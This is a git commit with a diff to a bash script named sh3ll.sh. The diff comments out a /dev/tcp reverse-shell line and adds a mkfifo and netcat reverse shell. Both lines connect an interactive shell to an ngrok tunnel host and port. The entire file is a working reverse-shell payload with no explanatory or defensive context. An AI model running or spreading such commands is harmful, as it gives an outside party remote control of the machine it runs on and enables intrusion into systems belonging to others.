a395106c5ab87217cfac20e77b3c248beb271284
Tenkph <60466511+Tenkph@users.noreply.github.com>
2024-10-26 11:57:20 +0300

    Update sh3ll.sh

--- sh3ll.sh
+++ sh3ll.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
 
 
-bash -i >& /dev/tcp/0.tcp.in.ngrok.io 14511 0>&1
+#bash -i >& /dev/tcp/0.tcp.in.ngrok.io 14511 0>&1
+
+mkfifo /tmp/lol;nc 0.tcp.in.ngrok.io 14511 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
